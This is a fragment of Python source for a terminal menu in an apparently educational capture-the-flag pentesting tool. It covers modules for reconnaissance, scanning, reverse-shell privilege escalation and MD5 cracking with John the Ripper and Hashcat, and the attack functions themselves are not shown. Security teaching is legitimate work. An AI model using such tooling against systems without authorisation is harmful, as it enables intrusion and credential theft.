    )
    table = Table(title="Select a Tool", box=box.HEAVY_EDGE, border_style="purple",show_lines=True)
    table.add_column("Tool", style="purple")
    table.add_column("Description", style="dim")
    table.add_row(
        "John the Ripper",
        "A fast and flexible password cracking tool that detects password hash types automatically "
        "and includes a customizable cracker. It supports hundreds of hash and cipher types including "
        "MD5, SHA1, SHA256, SHA512, and many others. Originally developed for Unix systems, it's now "
        "available for many platforms including Windows."
    )

    table.add_row(
        "Hashcat",
        "The world's fastest CPU/GPU password cracking tool. It's primarily used for recovering lost "
        "passwords by using methods like dictionary attacks, brute-force, rule-based attacks, and "
        "others. Hashcat supports over 300 hash types and can utilize multiple GPUs for faster "
        "cracking. Its MD5 cracking speed is particularly impressive, making it suitable for large "
        "scale password recovery tasks."
    )
    console.print(table)
    value_error_count = 0
    choice_error_count = 0
    while True:
        try:
            tool = int(console.input("\nPlease choose a tool (1-2) or (b) back:\n[green]kumCTF[/green]>"))
        except ValueError:
            console.print("[red]Value error, please enter a number between (1-2)![/red]\n[green]kumCTF[/green]>")
            value_error_count += 1
            if value_error_count >= 3:
                console.print("[red]Too many invalid values.Exiting...[/red]")
                exit()
            continue

        match tool:
            case 1:
                console.print("\nRunning [cyan]John The Ripper[/cyan]...")
                john_crack_md5()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    password_cracker()
                else:
                    back_again = console.input(
                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        password_cracker()
            case 2:
                console.print("\nRunning [cyan]hashcat[/cyan]...")
                hashcat_crack_md5()
                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
                if back == 'b':
                    clear_terminal()
                    password_cracker()
                else:
                    back_again = console.input(
                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
                    if back_again != 'b':
                        exit()
                    else:
                        clear_terminal()
                        password_cracker()
            case 3:
                print("\nGoing back...")
                clear_terminal()
                main_menu()
            case _:
                console.print("[red]Invalid choice, try again![/red]")
                choice_error_count += 1
                if choice_error_count >= 3:
                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                    exit()
                continue

def welcome():
    ascii_art = pyfiglet.figlet_format("kumCTF", font="big")
    colored_art = Text(ascii_art, style="green")

    intro_text = """
    [bold green]kumCTF[/bold green] is a beginner-friendly Capture The Flag (CTF) tool designed to help users 
    learn and practice basic pentesting techniques.
    

    It offers an interactive environment for common penetration testing tasks:
    - Information Gathering
    - Scanning
    - Privilege Escalation
    - Reverse Shell Exploits
    - Password Cracking (MD5 Hashes)

    The purpose of [green]kumCTF[/green] is to introduce newcomers to CTF challenges and 
    cybersecurity in an easy-to-understand way. It is designed for educational purposes, and its 
    tools are commonly used in penetration testing and ethical hacking scenarios.

    [bold red]Disclaimer:[/bold red]
    This tool is intended for ethical hacking and educational purposes only.
    It is [bold red][underline]NOT[/bold red][/underline] intended for unauthorized or illegal activities. 
    By using this tool, you agree that you are responsible for any actions that result from 
    using [green]kumCTF[/green].  
    Always ensure you have explicit permission before testing or interacting 
    with any system or network.
    """
    console.print(colored_art)
    console.print("Welcome to [green]kumCTF[/green]!",justify="center")
    console.print(intro_text,style="bold")
    console.input("Press any key to go main menu\n[green]kumCTF[/green]>")
    main_menu()

def main_menu():
    clear_terminal()
    console.print(
        Panel(
        "Welcome To [green]kumCTF[/green] choose the module you want to use!",
        title="[green]kumCTF[/green] - All Modules",
        box = box.SQUARE,
        border_style = "deep_sky_blue1"
    ))
    table = Table(title="Select a Module", box=box.HEAVY_EDGE, border_style="deep_sky_blue1", show_lines=True)
    table.add_column("Tool", style="bold white")
    table.add_column("Description", style="dim")

    table.add_row(
        "1-[green]Information Gathering[/green]",
        "A module used to gather information about a target system or network. It typically includes scanning tools and techniques to identify live hosts, open ports, services, and possible vulnerabilities."
    )
    table.add_row(
        "2-[blue]Scanning[/blue]",
        "This module is designed for identifying open ports and services on a target machine. It often uses tools like nmap to perform network discovery and vulnerability scanning."
    )
    table.add_row("3-[yellow]Privilege Escalation(with shell or reverse shell)[/yellow]",
        "A module focused on gaining higher-level access to a system after initial exploitation. It uses reverse shells to escalate privileges, allowing an attacker to run commands with elevated permissions."
                  )
    table.add_row("4-[purple]Password Cracker(MD5)[/purple]",
                  "A tool used to crack password hashes, specifically focusing on MD5. This module attempts to reverse-engineer hashed passwords through brute force, dictionary attacks, or rainbow tables."
                  )
    console.print(table)
    value_error_count = 0
    choice_error_count = 0
    while True:
        try:
            module = int(console.input("\nPlease choose a module (1-4) or (b) back:\n[green]kumCTF[/green]>"))
        except ValueError:
            console.print("[red]Value error, please enter a number between (1-4)![/red]\n[green]kumCTF[/green]>")
            value_error_count += 1
            if value_error_count >= 3:
                console.print("[red]Too many invalid values.Exiting...[/red]")
                exit()
            continue

        match module:
            case 1:
                clear_terminal()
                information_gathering()
            case 2:
                clear_terminal()
                scanning()
            case 3:
                clear_terminal()
                privilege_escalation()
            case 4:
                clear_terminal()
                password_cracker()
            case _:
                console.print("[red]Invalid choice, try again![/red]")
                choice_error_count += 1
                if choice_error_count >= 3:
                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                    exit()
                continue
welcome()